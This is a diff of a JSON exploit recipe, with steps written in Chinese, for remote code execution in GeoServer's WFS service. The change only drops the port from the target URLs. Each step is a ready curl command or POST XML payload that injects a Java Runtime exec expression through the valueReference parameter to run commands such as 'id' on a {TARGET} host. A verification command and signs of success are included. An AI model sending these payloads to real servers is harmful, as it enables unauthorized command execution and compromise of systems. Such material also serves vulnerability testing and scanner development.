@@ -34,26 +34,26 @@
     {
       "step": 1,
       "description": "获取可用的图层名（typeNames）",
-      "command": "curl \"http://{TARGET}:8080/geoserver/wfs?service=WFS&request=GetCapabilities\"",
+      "command": "curl \"http://{TARGET}/geoserver/wfs?service=WFS&request=GetCapabilities\"",
       "expected_result": "返回XML响应，包含如sf:archsites等typeNames",
       "notes": "typeNames必须存在，可在Web页面或GetCapabilities响应中找到"
     },
     {
       "step": 2,
       "description": "执行RCE验证命令（如id）",
-      "command": "curl \"http://{TARGET}:8080/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')\"",
+      "command": "curl \"http://{TARGET}/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')\"",
       "expected_result": "响应XML中包含命令执行结果（如uid=...），或出现java.lang.ClassCastException错误表示命令已执行",
       "notes": "valueReference参数注入exec表达式，可替换id为其他命令如touch /tmp/success"
     },
     {
       "step": 3,
       "description": "使用POST方法执行RCE（可选）",
-      "command": "curl -X POST http://{TARGET}:8080/geoserver/wfs -H \"Content-Type: application/xml\" -d \"<wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'><wfs:Query typeNames='sf:archsites'/><wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')</wfs:valueReference></wfs:GetPropertyValue>\"",
+      "command": "curl -X POST http://{TARGET}/geoserver/wfs -H \"Content-Type: application/xml\" -d \"<wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'><wfs:Query typeNames='sf:archsites'/><wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')</wfs:valueReference></wfs:GetPropertyValue>\"",
       "expected_result": "响应中出现java.lang.ClassCastException错误，表示命令执行成功",
       "notes": "POST请求需正确设置Content-Type和XML载荷，valueReference在XML中注入"
     }
   ],
-  "verification_command": "curl \"http://{TARGET}:8080/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')\"",
+  "verification_command": "curl \"http://{TARGET}/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')\"",
   "verification_success_sign": "响应XML中包含命令执行结果（如uid=...）或出现java.lang.ClassCastException错误",
   "requires_callback": false,
   "callback_note": "无需回连，直接通过exec表达式执行系统命令",
